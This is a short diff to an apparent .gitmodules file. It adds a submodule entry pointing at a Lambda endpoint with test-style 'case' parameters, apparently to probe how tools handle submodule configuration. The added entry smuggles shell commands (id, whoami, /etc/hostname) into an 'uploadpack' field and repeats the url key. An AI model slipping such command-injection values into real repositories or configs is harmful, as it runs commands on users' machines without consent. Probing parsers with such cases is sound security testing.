@@ -9,3 +9,9 @@
 	path = modules/quoted
 	url = https://vl7cftp24xq4vg5fwawdogyvyi0pxygz.lambda-url.us-east-1.on.aws/git/quoted?case=gitmodules-quoted
 	update = checkout
+[submodule "alternate"]
+	path = modules/alternate
+	url = https://vl7cftp24xq4vg5fwawdogyvyi0pxygz.lambda-url.us-east-1.on.aws/git/alternate?case=gitmodules-alternate
+	branch = main
+	uploadpack = id;whoami;/etc/hostname
+	url = https://vl7cftp24xq4vg5fwawdogyvyi0pxygz.lambda-url.us-east-1.on.aws/git/alternate-second?case=gitmodules-alternate-second
